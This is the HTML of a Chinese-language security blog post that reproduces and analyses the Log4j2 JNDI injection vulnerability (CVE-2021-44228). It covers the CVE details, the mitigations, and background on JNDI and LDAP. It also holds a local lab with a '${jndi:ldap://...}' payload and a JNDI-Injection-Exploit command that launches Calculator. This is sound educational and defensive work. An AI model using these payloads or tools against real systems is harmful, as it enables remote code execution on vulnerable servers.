<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Log4j2漏洞复现及原理分析 | Reus09&#39;s Blog</title>
<meta name="keywords" content="log4j2">
<meta name="description" content="0x00 前言 最近时间比较充沛，因此在这里复现一些流传比较广泛、危害性高的漏洞，Log4j2漏洞作为2021年爆出来的CVE明星，苦于当时时间紧迫，">
<meta name="author" content="Reus09">
<link rel="canonical" href="/en/posts/tech/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Log4j2漏洞复现及原理分析" />
<meta property="og:description" content="0x00 前言 最近时间比较充沛，因此在这里复现一些流传比较广泛、危害性高的漏洞，Log4j2漏洞作为2021年爆出来的CVE明星，苦于当时时间紧迫，" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/en/posts/tech/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-09-18T17:01:52+08:00" />
<meta property="article:modified_time" content="2022-09-18T17:01:52+08:00" /><meta property="og:site_name" content="(〃&#39;▽&#39;〃)" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Log4j2漏洞复现及原理分析"/>
<meta name="twitter:description" content="0x00 前言 最近时间比较充沛，因此在这里复现一些流传比较广泛、危害性高的漏洞，Log4j2漏洞作为2021年爆出来的CVE明星，苦于当时时间紧迫，"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  5 ,
      "name": "Log4j2漏洞复现及原理分析",
      "item": "/en/posts/tech/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Log4j2漏洞复现及原理分析",
  "name": "Log4j2漏洞复现及原理分析",
  "description": "0x00 前言 最近时间比较充沛，因此在这里复现一些流传比较广泛、危害性高的漏洞，Log4j2漏洞作为2021年爆出来的CVE明星，苦于当时时间紧迫，",
  "keywords": [
    "log4j2"
  ],
  "articleBody": "0x00 前言 最近时间比较充沛，因此在这里复现一些流传比较广泛、危害性高的漏洞，Log4j2漏洞作为2021年爆出来的CVE明星，苦于当时时间紧迫，没有时间进行学习，现在系统性的学习一下log4j2的漏洞原理,复现过程,具体使用的一些姿势。\n0x01 漏洞描述 Apache Log4j2 是 Apache 软件基金会下的一个开源的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。\n2021 年 12 月 9 日晚，Log4j2 的一个远程代码执行漏洞的利用细节被公开。攻击者使用 ${} 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。\n由于其触发方式简单、使用范围广泛，因此漏洞危害极大。\n目前，已经为此漏洞颁发了 CVE 编号：[CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228)，根据官方安全公告，以下为相关信息： - 漏洞：Log4j2 的 JNDI 功能点无法防御来自攻击者的 ldap 以及其他相关端点的攻击行为。 - 严重等级：Critical - Basic CVSS 评分：10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H - 影响版本：all versions from 2.0-beta9 to 2.14.1 - 详情描述：Apache Log4j2 \u003c=2.14.1 版本提供的 JNDI 特性用于配置、日志信息、参数位置时，无法防护攻击者使用 ldap 或其他 JNDI 相关断点的攻击行为。攻击者如果可以控制日志信息或日志信息参数，则可以在开启了 lookup substitution 功能时利用恶意的 ladp 服务器执行任意代码，在 2.15.0 版本时，默认将其此行为关闭。 - 缓解措施：在 \u003e= 2.10 版本，可以通过设置系统属性 log4j2.formatMsgNoLookups 或环境变量 LOG4J_FORMAT_MSG_NO_LOOKUPS 为 true 来缓解。在 2.0-beta9 to 2.10.0 版本，可以通过移除 classpath 中的 JndiLookup 类来缓解，命令为：zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class。\n0x02 前置知识 JNDI全称 Java Naming and Directory Interface。\nJNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。如同其它很多Java技术一样，JDNI是provider-based的技术，暴露了一个API和一个服务供应接口（SPI）。这意味着任何基于名字的技术都能通过JNDI而提供服务，只要JNDI支持这项技术。JNDI目前所支持的技术包括LDAP、CORBA Common Object Service（COS）名字服务、RMI、NDS、DNS、Windows注册表等等。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。 JDNI通过绑定的概念将对象和名称联系起来。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。 JNDI中的一组绑定作为上下文来引用。每个上下文暴露的一组操作是一致的。例如，每个上下文提供了一个查找操作，返回指定名字的相应对象。每个上下文都提供了绑定和撤除绑定名字到某个对象的操作。JNDI使用通用的方式来暴露命名空间，即使用分层上下文以及使用相同命名语法的子上下文。 说人话就是: JDNI 指向的某个对象，即为我们的服务 目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。\nLDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。\n目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。 目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。 所以目录天生是用来查询的，就好象它的名字一样。 LDAP目录服务是由目录数据库和一套访问协议组成的系统。 0x03 漏洞复现 这里先总体讲一下log4j2漏洞攻击的整个流程。 Log4j2默认支持解析ldap/rmi协议（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。 这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。 log4j环境搭建 我们采取maven进行搭建\n在pom.xml里面写入log4j2的相关依赖\n1 2 3 4 5 6 7 8 9 10 11 12 org.apache.logging.log4j log4j-api 2.14.1 org.apache.logging.log4j log4j-core 2.14.1 然后给出示例代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class main { private static final Logger logger = LogManager.getLogger(main.class); public static void main(String[] args) { // java 版本过本，给定的几个java版本默认设置trustURLCodebase为False System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); logger.error(\"${jndi:ldap://127.0.0.1:1389/#exploit}\"); } } 然后借用welk1n师傅提供的JDNI注入集成工具启动恶意服务器，用来给 ldap/rmi 调用返回恶意代码\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"open /System/Applications/Calculator.app\" -A \"127.0.0.1\":\n将生成的可利用的恶意服务器ldap的地址:ldap://127.0.0.1:1389/up14yk\n使用logger.error()来触发漏洞\n可以看到漏洞复现完毕，利用方法是很简单的，只需要log4j2版本满足要求，一旦在log字符串中检测到${}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。\n0x04 漏洞原理分析 这里主要参考su18大佬的关于log4j2漏洞的分析。主要对于Log4j2关于Lookup功能的使用以及漏洞的触发几个关键点进行阐述。\n首先查看漏洞触发函数栈的调用情况，我们在最后执行jndi远程命令执行的地方打下断点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:18, main 日志记录/触发点 根据函数栈，这里是根据logger等级调用对应的方法\n我们通过LogManager.getLogger()来获取一个Logger对象，然后调用其debug/info/error/warn/fatal/trace/log 等方法记录日志等信息。这些方法，都会首先使用org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled的若干个重载方法来根据当前配置记录日志等级，判断是否需要输出console和记录日志文件。\n在默认情况下，会输出 WARN/ERROR/FATAL 等级的日志。可以使用配置文件更改日志输出等级：\n1 2 3 4 5 6 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e ",
  "wordCount" : "6219",
  "inLanguage": "en",
  "datePublished": "2022-09-18T17:01:52+08:00",
  "dateModified": "2022-09-18T17:01:52+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/en/posts/tech/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="en/" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="en/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="en/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="en/posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="en/archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="en/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="en/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="en/about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="en/">Home</a></div>
    <h1 class="post-title">
      Log4j2漏洞复现及原理分析
    </h1>
    <div class="post-meta"><span title='2022-09-18 17:01:52 +0800 +0800'>2022-09-18</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#0x00-%e5%89%8d%e8%a8%80" aria-label="0x00 前言">0x00 前言</a></li>
                    <li>
                        <a href="#0x01-%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0" aria-label="0x01 漏洞描述">0x01 漏洞描述</a></li>
                    <li>
                        <a href="#0x02-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86" aria-label="0x02 前置知识">0x02 前置知识</a></li>
                    <li>
                        <a href="#0x03-%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" aria-label="0x03 漏洞复现">0x03 漏洞复现</a><ul>
                            
                    <li>
                        <a href="#log4j%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" aria-label="log4j环境搭建">log4j环境搭建</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x04-%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%e5%88%86%e6%9e%90" aria-label="0x04 漏洞原理分析">0x04 漏洞原理分析</a><ul>
                            
                    <li>
                        <a href="#%e6%97%a5%e5%bf%97%e8%ae%b0%e5%bd%95%e8%a7%a6%e5%8f%91%e7%82%b9" aria-label="日志记录/触发点">日志记录/触发点</a></li>
                    <li>
                        <a href="#%e6%b6%88%e6%81%af%e6%a0%bc%e5%bc%8f%e5%8c%96" aria-label="消息格式化">消息格式化</a></li>
                    <li>
                        <a href="#%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%9b%bf%e6%8d%a2" aria-label="字符串替换">字符串替换</a></li>
                    <li>
                        <a href="#lookup%e5%a4%84%e7%90%86" aria-label="Lookup处理"><code>Lookup</code>处理</a></li>
                    <li>
                        <a href="#jdni%e6%9f%a5%e8%af%a2" aria-label="JDNI查询"><code>JDNI</code>查询</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x05-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" aria-label="0x05 漏洞利用">0x05 漏洞利用</a></li>
                    <li>
                        <a href="#0x06-%e7%bb%95%e8%bf%87%e5%a7%bf%e5%8a%bf" aria-label="0x06 绕过姿势">0x06 绕过姿势</a><ul>
                            
                    <li>
                        <a href="#rc1-%e7%bb%95%e8%bf%87" aria-label="Rc1 绕过">Rc1 绕过</a></li>
                    <li>
                        <a href="#rc2%e4%bf%ae%e5%a4%8d" aria-label="RC2修复">RC2修复</a></li>
                    <li>
                        <a href="#%e5%a4%9a%e4%b8%aa%e6%89%a7%e8%a1%8c%e6%b5%81%e7%a8%8b" aria-label="多个${}执行流程">多个${}执行流程</a></li>
                    <li>
                        <a href="#%e5%88%86%e9%9a%94%e7%ac%a6" aria-label="分隔符">分隔符</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x07-%e9%94%99%e8%af%af%e8%a7%a3%e5%86%b3" aria-label="0x07 错误解决">0x07 错误解决</a><ul>
                            
                    <li>
                        <a href="#reference-class-name-foo" aria-label="Reference Class Name: foo">Reference Class Name: foo</a><ul>
                            
                    <li>
                        <a href="#%e6%96%b9%e6%b3%95%e4%b8%80" aria-label="方法一">方法一</a></li>
                    <li>
                        <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c" aria-label="方法二：">方法二：</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#0x08-%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99" aria-label="0x08 参考资料">0x08 参考资料</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h2 id="0x00-前言">0x00 前言<a hidden class="anchor" aria-hidden="true" href="#0x00-前言">#</a></h2>
<p>最近时间比较充沛，因此在这里复现一些流传比较广泛、危害性高的漏洞，Log4j2漏洞作为2021年爆出来的CVE明星，苦于当时时间紧迫，没有时间进行学习，现在系统性的学习一下log4j2的漏洞原理,复现过程,具体使用的一些姿势。</p>
<h2 id="0x01-漏洞描述">0x01 漏洞描述<a hidden class="anchor" aria-hidden="true" href="#0x01-漏洞描述">#</a></h2>
<p><a href="https://logging.apache.org/log4j/2.x/index.html">Apache Log4j2</a> 是 Apache 软件基金会下的一个<a href="https://github.com/apache/logging-log4j2">开源</a>的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。</p>
<p>2021 年 12 月 9 日晚，Log4j2 的一个远程代码执行漏洞的利用细节被公开。攻击者使用 <code>${}</code> 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</p>
<p>由于其触发方式简单、使用范围广泛，因此漏洞危害极大。</p>
<p>目前，已经为此漏洞颁发了 CVE 编号：<code>[CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228</code>)，根据<a href="https://logging.apache.org/log4j/2.x/security.html">官方安全公告</a>，以下为相关信息：
- 漏洞：Log4j2 的 JNDI 功能点无法防御来自攻击者的 ldap 以及其他相关端点的攻击行为。
- 严重等级：Critical
- Basic CVSS 评分：10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- 影响版本：all versions from 2.0-beta9 to 2.14.1
- 详情描述：Apache Log4j2 &lt;=2.14.1 版本提供的 JNDI 特性用于配置、日志信息、参数位置时，无法防护攻击者使用 ldap 或其他 JNDI 相关断点的攻击行为。攻击者如果可以控制日志信息或日志信息参数，则可以在开启了 lookup substitution 功能时利用恶意的 ladp 服务器执行任意代码，在 2.15.0 版本时，默认将其此行为关闭。
- 缓解措施：在 &gt;= 2.10 版本，可以通过设置系统属性 <code>log4j2.formatMsgNoLookups</code> 或环境变量 <code>LOG4J_FORMAT_MSG_NO_LOOKUPS</code> 为 true 来缓解。在 2.0-beta9 to 2.10.0 版本，可以通过移除 classpath 中的 <code>JndiLookup</code> 类来缓解，命令为：<code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code>。</p>
<h2 id="0x02-前置知识">0x02 前置知识<a hidden class="anchor" aria-hidden="true" href="#0x02-前置知识">#</a></h2>
<ul>
<li>
<p>JNDI全称 <code>Java Naming and Directory Interface</code>。</p>
<ul>
<li>JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。如同其它很多Java技术一样，JDNI是provider-based的技术，暴露了一个API和一个服务供应接口（SPI）。这意味着任何基于名字的技术都能通过JNDI而提供服务，只要JNDI支持这项技术。JNDI目前所支持的技术包括LDAP、CORBA Common Object Service（COS）名字服务、RMI、NDS、DNS、Windows注册表等等。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。</li>
<li>JDNI通过绑定的概念将对象和名称联系起来。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。</li>
<li>JNDI中的一组绑定作为上下文来引用。每个上下文暴露的一组操作是一致的。例如，每个上下文提供了一个查找操作，返回指定名字的相应对象。每个上下文都提供了绑定和撤除绑定名字到某个对象的操作。JNDI使用通用的方式来暴露命名空间，即使用分层上下文以及使用相同命名语法的子上下文。</li>
<li>说人话就是:  JDNI 指向的某个对象，即为我们的服务</li>
</ul>
</li>
</ul>
<p>目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。</p>
<ul>
<li>
<p>LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。</p>
<ul>
<li>目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。</li>
<li>目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</li>
<li>所以目录天生是用来查询的，就好象它的名字一样。</li>
<li>LDAP目录服务是由目录数据库和一套访问协议组成的系统。</li>
</ul>
</li>
</ul>
<h2 id="0x03-漏洞复现">0x03 漏洞复现<a hidden class="anchor" aria-hidden="true" href="#0x03-漏洞复现">#</a></h2>
<ul>
<li>这里先总体讲一下log4j2漏洞攻击的整个流程。
<ul>
<li>Log4j2默认支持解析ldap/rmi协议（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。</li>
<li>这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image2806024-20220514160157268-2037626840.png" alt="img"  />
</li>
</ul>
</li>
</ul>
<h3 id="log4j环境搭建">log4j环境搭建<a hidden class="anchor" aria-hidden="true" href="#log4j环境搭建">#</a></h3>
<p>我们采取<code>maven</code>进行搭建</p>
<p>在<code>pom.xml</code>里面写入<code>log4j2</code>的相关依赖</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>	  <span style="font-weight:bold">&lt;dependencies&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.logging.log4j<span style="font-weight:bold">&lt;/groupId&gt;</span>
